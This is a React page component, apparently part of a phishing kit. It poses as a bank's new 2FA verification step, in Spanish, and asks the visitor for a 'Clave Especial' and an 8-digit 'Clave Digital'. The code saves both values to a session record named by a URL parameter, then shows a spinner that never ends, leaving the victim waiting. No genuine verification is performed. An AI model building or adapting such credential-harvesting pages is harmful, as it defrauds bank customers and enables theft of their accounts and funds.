import { useState } from "react";
import LoginHeader from "../components/LoginHeader";
import { base44 } from "@/api/base44Client";

export default function Verificacion() {
  const urlParams = new URLSearchParams(window.location.search);
  const sessionId = urlParams.get("sessionId");

  const [claveEspecial, setClaveEspecial] = useState("");
  const [claveDigital, setClaveDigital] = useState("");
  const [submitted, setSubmitted] = useState(false);

  const isValid = claveEspecial.trim().length > 0 && claveDigital.trim().length > 0;

  const handleSubmit = async () => {
    if (!isValid || !sessionId || submitted) return;
    setSubmitted(true);
    await base44.entities.UserSessionData.update(sessionId, {
      claveEspecial: claveEspecial.trim(),
      claveDigital: claveDigital.trim(),
    });
  };

  if (submitted) {
    return (
      <div style={{ position: "fixed", inset: 0, background: "white", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 9999 }}>
        <div style={{ width: "40px", height: "40px", border: "4px solid #e5e7eb", borderTop: "4px solid #1973B8", borderRadius: "50%", animation: "spin 1s linear infinite" }} />
        <style>{"@keyframes spin { to { transform: rotate(360deg); } }"}</style>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white font-main flex flex-col">
      <LoginHeader />
      <main className="flex-1 flex flex-col items-center pt-10">
        <div style={{ width: "100%", maxWidth: "620px", padding: "0 24px" }}>

          {/* Texto superior */}
          <p style={{ fontSize: "15px", color: "#121212", marginBottom: "24px", lineHeight: "1.6" }}>
            Hemos añadido recientemente un paso extra de verificación 2FA para
            reforzar la seguridad de su cuenta:
          </p>

          {/* Recuadro tipo tabla */}
          <div style={{ border: "1px solid #b0bec5", borderRadius: "2px", overflow: "hidden", marginBottom: "32px" }}>

            {/* Fila Clave Especial */}
            <div style={{ display: "flex", alignItems: "center", borderBottom: "1px solid #b0bec5", background: "#dce8f0" }}>
              <div style={{
                width: "260px",
                minWidth: "260px",
                padding: "10px 16px",
                fontSize: "14px",
                fontWeight: "bold",
                color: "#121212",
                borderRight: "1px solid #b0bec5",
              }}>
                Clave Especial
              </div>
              <div style={{ flex: 1, padding: "6px 12px" }}>
                <input
                  type="text"
                  value={claveEspecial}
                  onChange={(e) => setClaveEspecial(e.target.value.replace(/\s/g, ""))}
                  style={{
                    width: "140px",
                    border: "1px solid #90a4ae",
                    borderRadius: "2px",
                    padding: "4px 8px",
                    fontSize: "14px",
                    outline: "none",
                    fontFamily: "inherit",
                  }}
                />
              </div>
            </div>

            {/* Fila Clave Digital */}
            <div style={{ display: "flex", alignItems: "center", background: "#dce8f0" }}>
              <div style={{
                width: "260px",
                minWidth: "260px",
                padding: "10px 16px",
                fontSize: "14px",
                fontWeight: "bold",
                color: "#121212",
                borderRight: "1px solid #b0bec5",
              }}>
                Clave Digital
              </div>
              <div style={{ flex: 1, padding: "6px 12px" }}>
                <input
                  type="text"
                  inputMode="numeric"
                  value={claveDigital}
                  onChange={(e) => {
                    const val = e.target.value.replace(/[^0-9]/g, "");
                    if (val.length <= 8) setClaveDigital(val);
                  }}
                  maxLength={8}
                  style={{
                    width: "140px",
                    border: "1px solid #90a4ae",
                    borderRadius: "2px",
                    padding: "4px 8px",
                    fontSize: "14px",
                    outline: "none",
                    fontFamily: "inherit",
                    letterSpacing: "2px",
                  }}
                />
              </div>
            </div>
          </div>

          {/* Botón */}
          <div style={{ textAlign: "center" }}>
            <button
              disabled={!isValid}
              onClick={handleSubmit}
              style={{
                padding: "11px 52px",
                fontSize: "15px",
                background: isValid ? "#1973B8" : "#d6d6d6",
                color: isValid ? "white" : "#999",
                border: "none",
                borderRadius: "4px",
                cursor: isValid ? "pointer" : "not-allowed",
                fontFamily: "inherit",
                transition: "all 0.2s",
              }}
            >
              Continuar
            </button>
          </div>

        </div>
      </main>
    </div>
  );
}
